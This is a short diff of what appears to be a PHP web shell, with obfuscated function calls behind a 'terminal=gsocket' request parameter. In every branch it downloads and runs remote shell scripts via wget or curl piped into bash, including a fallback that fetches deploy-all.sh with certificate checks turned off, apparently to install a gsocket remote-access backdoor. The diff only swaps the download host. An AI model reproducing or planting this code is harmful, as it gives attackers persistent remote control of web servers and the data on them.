@@ -979,9 +979,9 @@ elseif ($_GET['terminal'] == "gsocket") :
     $wget_available = $fungsi[19]('command -v wget');
 
     if ($wget_available) {
-        $fungsi[16]('bash -c "$(wget --no-verbose -O- https://7x1337.com/y)"', $output, $return_var);
+        $fungsi[16]('bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"', $output, $return_var);
     } else {
-        $fungsi[16]('bash -c "$(curl -fsSL https://7x1337.com/y)"', $output, $return_var);
+        $fungsi[16]('bash -c "$(curl -fsSL https://gsocket.io/y)"', $output, $return_var);
     }
     if ($return_var !== 0) {
         $fungsi[16]('wget --no-check-certificate http://nossl.segfault.net/deploy-all.sh && bash deploy-all.sh', $output, $return_var);
